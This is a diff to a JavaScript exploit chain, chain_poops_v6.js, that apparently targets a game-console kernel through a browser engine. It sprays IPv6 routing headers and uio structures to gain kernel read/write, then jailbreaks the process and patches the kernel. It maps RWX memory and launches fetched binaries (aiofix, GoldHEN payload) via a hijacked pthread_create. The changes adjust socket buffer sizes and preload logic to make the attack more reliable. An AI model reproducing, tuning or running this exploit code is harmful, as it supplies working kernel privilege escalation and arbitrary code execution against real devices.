@@ -1,7 +1,4 @@
-// chain_poops_v6.js — landUio con yield/drain + NUM_UIO_SPRAY reducido
-// ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
-// module record and releaseFakeCell() (only call site: mem.js:662) reaches a
-// virgin instance, pinning ~137 MB for the life of the page.
+// chain_poops_v6.js — fix de SO_SNDBUF grande + aiofix + GoldHEN
 import { establishPrimitive } from "./core.js?v=10";
 import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
@@ -29,11 +26,11 @@ const CFG_DO_MAKE_KARW  = 1;
 const CFG_DO_JAILBREAK  = 1;
 const CFG_DO_KPATCH     = 1;
 const CFG_DO_PAYLOAD    = 1;
+
+// *** FIX: SO_SNDBUF grande para que writev no bloquee ***
+const CFG_SOCK_BUF      = 0x4000;   // 16 KB, era `size` antes
 // ============================================================
 
-// ============================================================
-// TELEMETRÍA
-// ============================================================
 const TM = window.__TM = window.__TM || {
     startedAt: Date.now(), errors: [], stages: {}, diagnostics: {}
 };
@@ -124,11 +121,10 @@ const KQ_BATCH = 8;
 const KQ_HDR_MAGIC = 0x1430000;
 
 const NUM_UIO_IOV = 0x14, UIO_SIZE = 0x30;
-// *** FIX: bajado de 10000 a 512 para evitar OOM ***
 const NUM_UIO_SPRAY = 512;
 const NUM_IOV_SPRAY_MAX = 100000;
 const UIO_READ = 0, UIO_WRITE = 1, UIO_SYSSPACE = 1;
-const SOL_SOCKET = 0xffff, SO_SNDBUF = 0x1001;
+const SOL_SOCKET = 0xffff, SO_SNDBUF = 0x1001, SO_RCVBUF = 0x1002;
 
 const PIPEBUF_SIZEOF = 0x18, PIPE_PAGE = 0x4000, FILEDESCENT_SIZE = 8;
 const F_SETFL = 4, O_NONBLOCK = 4;
@@ -184,9 +180,9 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         mark("PLAN", "iov=" + NUM_IOV_WORKER + " uio=" + CFG_UIO_WORKERS
             + " attempts=" + NUM_ATTEMPT + " msdelay=" + MS_DELAY
             + " rtp=" + CFG_USE_REALTIME + " pair=" + CFG_USE_PAIR
-            + " uio_spray=" + NUM_UIO_SPRAY
             + " karw=" + CFG_DO_MAKE_KARW + " jb=" + CFG_DO_JAILBREAK
-            + " kp=" + CFG_DO_KPATCH + " pl=" + CFG_DO_PAYLOAD);
+            + " kp=" + CFG_DO_KPATCH + " pl=" + CFG_DO_PAYLOAD
+            + " sockbuf=0x" + CFG_SOCK_BUF.toString(16));
 
         tmDiag('fw_key', key);
 
@@ -211,12 +207,12 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         mark("KPATCH-BLOB", kpatch ? "bytes=" + kpatch.length + " sites=" + KPATCH_JMP_SITES.length : "MISSING");
 
         try {
-            const r = await fetch("afix1.bin");
+            const r = await fetch("aiofix.bin");
             if (r.ok) aiofix = new Uint8Array(await r.arrayBuffer());
         } catch (e) { mark("AIOFIX-FETCH-THREW", e.message); }
         mark("AIOFIX-BLOB", aiofix
             ? "bytes=" + aiofix.length + " magic=" + (aiofix[0] === 0x7f ? "ELF" : "0x" + aiofix[0].toString(16))
-            : "MISSING");
+            : "MISSING -- se usara solo GoldHEN");
 
         try {
             const r = await fetch("payload.bin");
@@ -360,7 +356,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         try { pivotCell = p.leakval(pivotObj); } catch (le) { mark("PIVOT-LEAKVAL-THREW", le.message); }
         if (!pivotCell || typeof pivotCell.low !== "number" || typeof pivotCell.hi !== "number") {
             mark("PIVOT-CELL-INVALID", "pivotCell=" + pivotCell);
-            state("PRIMITIVA INESTABLE", "bad");
+            state("PRIMITIVA INESTABLE -- reboot y reintenta", "bad");
             return;
         }
         mark("PIVOT-CELL", "pivotCell=" + pivotCell);
@@ -368,10 +364,11 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         mainArmed = true;
 
         function callAddr(target, args) {
-            if (!target || typeof target.low !== "number") throw new Error("callAddr: target is not an int64");
+            if (!target || typeof target.low !== "number") throw new Error("callAddr: target is not an int64 (" + target + ")");
             layout(M, target, args);
             const saved = p.read8(pivotCell);
-            if (!saved || typeof saved.low !== "number") throw new Error("callAddr: saved invalid");
+            if (!saved || typeof saved.low !== "number") throw new Error("callAddr: p.read8(pivotCell) returned " + saved);
+            if (!M.S || typeof M.S.low !== "number") throw new Error("callAddr: M.S is not an int64 (" + M.S + ")");
             p.write8(pivotCell, M.S);
             Math.expm1(pivotObj);
             p.write8(pivotCell, saved);
@@ -381,7 +378,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             const a = Array.prototype.slice.call(arguments, 1);
             if (num === undefined || num === null || typeof num !== "number") throw new Error("sc: num is " + num);
             const stub = stubAddr.get(num);
-            if (!stub || typeof stub.low !== "number") throw new Error("sc: no stub for syscall " + num);
+            if (!stub || typeof stub.low !== "number") throw new Error("sc: no stub for syscall " + num + " (0x" + (num >>> 0).toString(16) + ")");
             return callAddr(stub, a);
         };
 
@@ -393,7 +390,8 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         const pid = sc(SYS.getpid).i32;
         check("chain-reaches-kernel", pid > 0, "pid=" + pid + " uid=" + sc(SYS.getuid).i32);
 
-        const scratchAb = new ArrayBuffer(0x1000); keepAlive.push(scratchAb);
+        // *** FIX: scratchAb más grande para soportar preloads ***
+        const scratchAb = new ArrayBuffer(0x8000); keepAlive.push(scratchAb);
         const scratch = bufAddr(scratchAb);
         const argAb = new ArrayBuffer(8); keepAlive.push(argAb);
         const argAddr = bufAddr(argAb), argDv = new DataView(argAb);
@@ -430,7 +428,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         const sprayLen = buildRthdr(sprayDv, UCRED_SIZE);
         const setRthdr = s => sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, sprayAddr, sprayLen).i32;
         const freeRthdr = s => {
-            if (burned.has(s)) { mark("FREERTHDR-REFUSED", "fd=" + s); return -1; }
+            if (burned.has(s)) { mark("FREERTHDR-REFUSED", "fd=" + s + " is burned"); return -1; }
             return sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, 0, 0).i32;
         };
         function getRthdr(s, size, need) {
@@ -901,58 +899,29 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             return triplets && triplets.length === 3 && triplets.every(fd => fd > 0 && ipv6.indexOf(fd) >= 0);
         }
 
-        // *** FIX: landUio con try/catch + drain + yield cada 32 rounds ***
+        // *** FIX: landUio con try/catch, drain y yield ***
         async function landUio(size, forWrite, tasks) {
-            if (!tripletsUsable()) { mark("UIO-LAND-REFUSED", "triplets="
-                + triplets.join(",")); return null; }
-
-            trace("UIO-LAND", "call=" + (forWrite ? "readv" : "writev")
-                + " size=" + size);
+            if (!tripletsUsable()) { mark("UIO-LAND-REFUSED", "triplets=" + triplets.join(",")); return null; }
+            trace("UIO-LAND", "call=" + (forWrite ? "readv" : "writev") + " size=" + size);
             freeRthdr(triplets[2]);
-            const uioDeadline = Date.now() + (params.has("uioms")
-                ? parseInt(params.get("uioms"), 10) : 60000);
+            const uioDeadline = Date.now() + (params.has("uioms") ? parseInt(params.get("uioms"), 10) : 60000);
             for (let i = 0; i < NUM_UIO_SPRAY; ++i) {
-                if ((i & 0x3f) === 0 && Date.now() > uioDeadline) {
-                    mark("UIO-LAND-TIMEOUT", "rounds=" + i);
-                    break;
-                }
+                if ((i & 0x3f) === 0 && Date.now() > uioDeadline) { mark("UIO-LAND-TIMEOUT", "rounds=" + i); break; }
                 if (i && i % 256 === 0) mark("UIO-LAND-ROUND", "i=" + i);
                 for (let k = 0; k < uioWorkers.length; ++k)
-                    tasks[k] = fireW(uioWorkers[k],
-                        forWrite ? SYS.readv : SYS.writev,
-                        [forWrite ? uioSs[0] : uioSs[1], uioIovAddr, NUM_UIO_IOV], 0);
+                    tasks[k] = fireW(uioWorkers[k], forWrite ? SYS.readv : SYS.writev, [forWrite ? uioSs[0] : uioSs[1], uioIovAddr, NUM_UIO_IOV], 0);
                 sc(SYS.sched_yield);
-
-                if (getRthdr(triplets[0], IOVEC_SIZE) >= 0
-                    && leakDv.getInt32(8, true) === NUM_UIO_IOV) {
-                    return new int64(leakDv.getUint32(0, true),
-                                     leakDv.getUint32(4, true));
-                }
-                // Wake parked workers
-                if (forWrite) {
-                    for (let k = 0; k < uioWorkers.length; ++k)
-                        sc(SYS.write, uioSs[1], scratch, size);
-                } else {
-                    sc(SYS.read, uioSs[0], scratch, size);
-                    for (let k = 0; k < uioWorkers.length; ++k)
-                        sc(SYS.read, uioSs[0], scratch, size);
-                }
-                // *** try/catch para que un worker que falle no aborte el loop ***
+                if (getRthdr(triplets[0], IOVEC_SIZE) >= 0 && leakDv.getInt32(8, true) === NUM_UIO_IOV)
+                    return new int64(leakDv.getUint32(0, true), leakDv.getUint32(4, true));
+                if (forWrite) { for (let k = 0; k < uioWorkers.length; ++k) sc(SYS.write, uioSs[1], scratch, size); }
+                else { sc(SYS.read, uioSs[0], scratch, size); for (let k = 0; k < uioWorkers.length; ++k) sc(SYS.read, uioSs[0], scratch, size); }
                 try { await Promise.all(tasks); } catch (_) { }
-                // *** Drain extra bytes que el worker parked pudo haber dejado ***
-                for (let k = 0; k < uioWorkers.length; ++k) {
-                    try { sc(SYS.read, uioSs[0], scratch, 4); } catch (_) { }
-                }
+                for (let k = 0; k < uioWorkers.length; ++k) { try { sc(SYS.read, uioSs[0], scratch, 4); } catch (_) { } }
                 if (!forWrite) sc(SYS.write, uioSs[1], scratch, size);
-
-                // *** Yield al event loop cada 32 rounds para que el GC corra ***
-                if ((i & 0x1f) === 0x1f) {
-                    await new Promise(r => setTimeout(r, 0));
-                }
+                if ((i & 0x1f) === 0x1f) await new Promise(r => setTimeout(r, 0));
             }
             return null;
         }
-
         async function landFakeUio(tasks) {
             if (!tripletsUsable()) { mark("FAKEUIO-REFUSED", "triplets=" + triplets.join(",")); return false; }
             freeRthdr(triplets[1]);
@@ -964,17 +933,15 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 sc(SYS.sched_yield);
                 if (getRthdr(triplets[0], UIO_SIZE + IOVEC_SIZE) >= 0 && leakDv.getUint32(0x20, true) === UIO_SYSSPACE) return true;
                 for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
-                try { await Promise.all(tasks); } catch (_) { }
+                await Promise.all(tasks);
                 for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.read, iovSs[0], scratch, 1);
-                if ((i & 0x1f) === 0x1f) {
-                    await new Promise(r => setTimeout(r, 0));
-                }
+                if ((i & 0x3f) === 0x3f) await new Promise(r => setTimeout(r, 0));
             }
             return false;
         }
         async function releaseIov(itasks) {
             for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
-            try { await Promise.all(itasks); } catch (_) { }
+            await Promise.all(itasks);
             for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.read, iovSs[0], scratch, 1);
         }
         function tripletsAgree(why) {
@@ -1027,9 +994,13 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 new Uint8Array(ab).fill(0x41);
                 return { ab: ab, addr: bufAddr(ab), dv: new DataView(ab) };
             });
-            lenDv.setUint32(0, size, true);
+            // *** FIX: SO_SNDBUF y SO_RCVBUF grandes, no `size` ***
+            lenDv.setUint32(0, CFG_SOCK_BUF, true);
             sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
-            sc(SYS.write, uioSs[1], scratch, size);
+            sc(SYS.setsockopt, uioSs[0], SOL_SOCKET, SO_RCVBUF, lenAddr, 4);
+            // *** FIX: preload acotado ***
+            const preload = Math.min(size * (uioWorkers.length + 4), 0x800);
+            sc(SYS.write, uioSs[1], scratch, preload);
             put(uioIovDv, 8, size);
             const utasks = new Array(uioWorkers.length);
             const uioIov = await landUio(size, false, utasks);
@@ -1047,7 +1018,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 drained++;
                 if (!got && !(b.dv.getUint32(0, true) === 0x41414141 && b.dv.getUint32(4, true) === 0x41414141)) got = b.dv;
             }
-            try { await Promise.all(utasks); } catch (_) { }
+            await Promise.all(utasks);
             restoreRefcntIov();
             await refindTriplets(itasks);
             return got;
@@ -1057,8 +1028,13 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             if (!kaddrOk(dst)) { mark("KWRITE-REFUSED", "bad-dst=" + dst); return false; }
             if (!tripletsUsable()) { mark("KWRITE-REFUSED", "triplets=" + triplets.join(",")); return false; }
             mark("KWRITE-BEGIN", "dst=" + dst + " size=" + size);
-            lenDv.setUint32(0, size, true);
+            // *** FIX: SO_SNDBUF y SO_RCVBUF grandes, no `size` ***
+            lenDv.setUint32(0, CFG_SOCK_BUF, true);
             sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
+            sc(SYS.setsockopt, uioSs[0], SOL_SOCKET, SO_RCVBUF, lenAddr, 4);
+            // *** FIX: preload acotado ***
+            const preload = Math.min(size * (uioWorkers.length + 4), 0x800);
+            sc(SYS.write, uioSs[1], scratch, preload);
             put(uioIovDv, 8, size);
             const utasks = new Array(uioWorkers.length);
             const uioIov = await landUio(size, true, utasks);
@@ -1069,12 +1045,15 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             const ok = await landFakeUio(itasks);
             if (!ok) { kreadPoisoned = true; await unwind(utasks, itasks, "no-fake-uio", false, size); return false; }
             for (let k = 0; k < uioWorkers.length; ++k) sc(SYS.write, uioSs[1], srcAddr, size);
-            try { await Promise.all(utasks); } catch (_) { }
+            await Promise.all(utasks);
             restoreRefcntIov();
             await refindTriplets(itasks);
             return true;
         }
 
+        // ============================================================
+        // make_karw: pipes
+        // ============================================================
         if (kernelBase && triplets) {
             const KREAD_TRIES = params.has("kreadtries") ? parseInt(params.get("kreadtries"), 10) : 4;
             async function kread8(a) {
@@ -1214,6 +1193,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                         check("four-karw-pipe-files-hold", allOk, "");
                     }
 
+                    // Jailbreak
                     let jailbroken = false, curproc = null;
                     if (CFG_DO_JAILBREAK === 1) try {
                         const FIOSETOWN = 0x8004667c;
@@ -1267,6 +1247,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                         }
                     } catch (jbe) { mark("JAILBREAK-THREW", jbe.message || String(jbe)); }
 
+                    // KPATCH
                     let kpatched = false;
                     if (CFG_DO_KPATCH === 1 && jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) try {
                         state("kernel patches...", "warn");
@@ -1319,9 +1300,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                         }
                     } catch (kpe) { mark("KPATCH-THREW", kpe.message || String(kpe)); }
 
-                    // ============================================================
-                    // PAYLOAD: aiofix primero, GoldHEN después
-                    // ============================================================
+                    // PAYLOAD EN DOS ETAPAS
                     let payloadRunning = false;
                     let aiofixRan = false;
 
@@ -1334,12 +1313,14 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                             const am = sc(SYS.mmap, 0, asz, 7, 0x1002, -1, 0);
                             const aEntry = new int64(am.lo, am.hi);
                             mark("AIOFIX-MAP", "size=0x" + asz.toString(16) + " rwx=" + aEntry);
+
                             if (aEntry.hi > 0) {
                                 for (let i = 0; i < aiofix.length; ++i) p.write1(aEntry.add32(i), aiofix[i]);
                                 let aBad = -1;
                                 for (let i = 0; i < aiofix.length; ++i)
                                     if (p.read1(aEntry.add32(i)) !== aiofix[i]) { aBad = i; break; }
                                 check("aiofix-byte-rwx-memory", aBad < 0, aBad < 0 ? aiofix.length + " bytes" : "mismatch at +" + hx(aBad));
+
                                 if (aBad < 0 && off.wk___imp_pthread_create !== undefined) {
                                     const slot = webkitBase.add32(off.wk___imp_pthread_create);
                                     const fn = p.read8(slot);
@@ -1354,11 +1335,9 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                                         aiofixRan = aRc === 0 && aHandle.hi > 0;
                                         mark("AIOFIX-THREAD", "rc=" + aRc + " handle=" + aHandle);
                                         check("aiofix-thread-created", aiofixRan, "");
-                                        if (aiofixRan) {
-                                            mark("AIOFIX-RUNNING", "bytes=" + aiofix.length + " entry=" + aEntry);
-                                            mark("AIOFIX-SETTLE", "esperando 1500ms");
-                                            nanosleepMs(1500);
-                                        }
+                                        if (aiofixRan) mark("AIOFIX-RUNNING", "bytes=" + aiofix.length + " entry=" + aEntry);
+                                        mark("AIOFIX-SETTLE", "esperando 1500ms");
+                                        nanosleepMs(1500);
                                     }
                                 }
                             }
@@ -1373,12 +1352,14 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                             const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
                             const entry = new int64(m.lo, m.hi);
                             mark("PAYLOAD-MAP", "size=0x" + sz.toString(16) + " rwx=" + entry);
+
                             if (entry.hi > 0) {
                                 for (let i = 0; i < payload.length; ++i) p.write1(entry.add32(i), payload[i]);
                                 let bad = -1;
                                 for (let i = 0; i < payload.length; ++i)
                                     if (p.read1(entry.add32(i)) !== payload[i]) { bad = i; break; }
                                 check("byte-payload-rwx-memory", bad < 0, bad < 0 ? payload.length + " bytes" : "mismatch at +" + hx(bad));
+
                                 if (bad < 0 && off.wk___imp_pthread_create !== undefined) {
                                     const slot = webkitBase.add32(off.wk___imp_pthread_create);
                                     const fn = p.read8(slot);
@@ -1394,9 +1375,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                                         payloadRunning = rc === 0 && handle.hi > 0;
                                         mark("PTHREAD-CREATE", "rc=" + rc + " handle=" + handle);
                                         check("payload-thread-created", payloadRunning, "");
-                                        if (payloadRunning) mark("PAYLOAD-RUNNING",
-                                            "bytes=" + payload.length + " entry=" + entry
-                                            + " aiofix_before=" + aiofixRan);
+                                        if (payloadRunning) mark("PAYLOAD-RUNNING", "bytes=" + payload.length + " entry=" + entry + " aiofix_before=" + aiofixRan);
                                     }
                                 }
                             }
@@ -1404,9 +1383,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                     }
 
                     mark("STEP10-CHAIN", "kv=up jailbroken=" + jailbroken
-                        + " kpatched=" + kpatched
-                        + " aiofix=" + aiofixRan
-                        + " payload=" + payloadRunning);
+                        + " kpatched=" + kpatched + " aiofix=" + aiofixRan + " payload=" + payloadRunning);
 
                     if (payloadRunning) { allDone = true; mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=1 aiofix=" + aiofixRan + " payload=1"); }
                     else if (kpatched) mark("SAFE-TO-EXIT", "karw=1 root=1 kpatch=1 payload=0");
